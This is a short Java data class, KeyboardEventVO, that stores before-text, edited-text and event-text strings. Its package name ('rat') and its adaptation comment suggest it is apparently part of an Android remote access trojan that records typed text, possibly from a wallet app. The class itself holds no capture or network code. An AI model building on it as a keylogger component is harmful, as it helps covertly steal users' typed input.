package com.vendor.rat.data.stat;

import androidx.annotation.NonNull;
import java.io.Serializable;

// ADAPT: vendor com.guard.wallet.stat.KeyboardEventVO
public class KeyboardEventVO implements Serializable {
    private String beforeText;
    private String editText;
    private String eventText;

    public KeyboardEventVO() {
    }

    public KeyboardEventVO(String beforeText, String editText, String eventText) {
        this.beforeText = beforeText;
        this.editText = editText;
        this.eventText = eventText;
    }

    public String getBeforeText() {
        return this.beforeText;
    }

    public String getEditText() {
        return this.editText;
    }

    public String getEventText() {
        return this.eventText;
    }

    public void setBeforeText(String beforeText) {
        this.beforeText = beforeText;
    }

    public void setEditText(String editText) {
        this.editText = editText;
    }

    public void setEventText(String eventText) {
        this.eventText = eventText;
    }

    @NonNull
    public String toString() {
        return "KeyboardEventStatVO{beforeText='" + this.beforeText
                + "', editText='" + this.editText
                + "', eventText='" + this.eventText + "'}";
    }
}
